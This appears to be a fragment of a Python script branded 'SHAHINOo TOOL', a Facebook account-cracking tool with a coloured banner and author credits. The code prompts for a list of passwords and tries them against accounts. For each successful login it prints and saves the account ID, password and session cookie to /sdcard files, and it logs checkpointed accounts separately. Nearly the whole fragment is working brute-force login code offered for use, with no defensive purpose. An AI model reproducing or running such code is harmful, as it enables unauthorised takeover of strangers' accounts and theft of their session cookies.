...
\033[1;37m================= \33[32;45mERROR_SHAHIN\33[0;m =====================
     Source By : ERROR_SHAHIN
\033[1;32m     \033[1;33mCOPY PASTE BY\33[0;m   :  \033[1;33mSHAHIN\33[0;m\033[1;32m _R_ \033[1;33mERROR\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[96;1m SHAHIN\____ðŸ˜˜ðŸ˜ˆðŸ˜˜
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mERROR-SHAHIN
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mTEAM-ERROR
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.4
\033[1;37m================= \33[32;45mSHAHINOo\33[0;m =====================

       \33[37;41m\t WELLCOME TO SHAHINOo TOOL\33[0;m
...
def i():
    ...
    HamiiID = []
    print("")
    for shahin in range(passx):
        pww = input(f"[*] Enter Password {shahin+1} : ")
        HamiiID.append(pww)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m(SHAHIN-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/SHAHIN-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m(SHAHIN-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/SHAHIN-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s[SHAHIN] [%s/%s]  OK:- %s  CP:- %s '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
